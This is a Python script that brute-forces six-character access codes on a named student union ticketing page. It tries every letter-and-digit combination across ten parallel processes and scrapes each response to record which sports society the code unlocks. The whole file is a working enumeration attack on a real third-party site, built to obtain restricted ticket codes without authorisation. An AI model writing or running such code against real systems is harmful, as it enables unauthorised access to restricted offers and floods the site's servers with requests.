# Program to automatically find access codes for sports night societies

from typing import Generator
from requests.adapters import HTTPAdapter, Retry
from bs4 import BeautifulSoup, NavigableString, Tag
from multiprocessing import Pool, Manager
from file_utils import save_dictionary_to_file
import requests
import threading
import time
import string
import itertools
import logging
import os

logger = logging.getLogger(__name__)
logging.basicConfig(filename='output.log',encoding='utf-8', level=logging.INFO)
logger.setLevel("INFO")

url = "https://www.guildofstudents.com/ents/event/9497/?code="

characters: list[str] = string.ascii_uppercase + string.digits

POSSIBLE_CODES: Generator[str, None, None] = (f"{a}{b}{c}{d}{e}{f}" for a, b, c, d, e, f in itertools.product(characters, repeat=6))

def check_for_code(args: list[str]) -> None:
    code: str = args[0]
    valid_codes: dict[str, str] = args[1]
    lock: threading.Lock = args[2]
    logger.info("Checking code: " + code)

    session = requests.Session()
    retries = Retry(total=10, backoff_factor=30, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))


    page = session.get(url + code).text

    soup = BeautifulSoup(page, 'html.parser')

    inner_ticket_box: Tag | NavigableString | None = soup.find('div', class_="event_tickets")

    if not inner_ticket_box or not isinstance(inner_ticket_box, Tag):
        logger.error("Inner ticket box not found")
        return

    if len(inner_ticket_box.find_all('div', class_="event_ticket")) == 1:
        logger.info("Valid Code! " + code)
        # get the span inside the first div
        society_name = inner_ticket_box.find('div').find('span').text
        # format: £6.00 (Swimming)
        # Find the value in the brackets
        society_name: str = society_name[society_name.find("(") + 1:society_name.find(")")]
        logger.info("Society name: " + society_name)
        # save to the dictionary
        logger.info("Found valid code: " + code + " for society: " + society_name)
        with lock:
            valid_codes[society_name] = code
    else: 
        logger.error("Unexpected number of DIVs... found: " + str(len(inner_ticket_box.find_all('div'))))
        logger.debug(inner_ticket_box)


def iterate_over_all_codes(possible_codes = POSSIBLE_CODES) -> None:
    # codes can be any 6 digits, so iterate over all of them
    with Manager() as manager:

        valid_codes: dict[str, str] = manager.dict()
        lock: threading.Lock = manager.Lock()

        with Pool(processes=10) as pool:
            for _ in pool.imap_unordered(check_for_code, ((code, valid_codes, lock) for code in possible_codes), chunksize=500):
                pass

        save_dictionary_to_file(dict(valid_codes))


if __name__ == "__main__":
    single_code = (True if os.getenv("SINGLE_CODE", "false") == "true" else False) 

    if single_code:
        iterate_over_all_codes()
    else:
        iterate_over_all_codes(possible_codes=(f"{a}{b}{c}{d}{e}{f}" for a, b, c, d, e, f in itertools.product('a', repeat=6)))
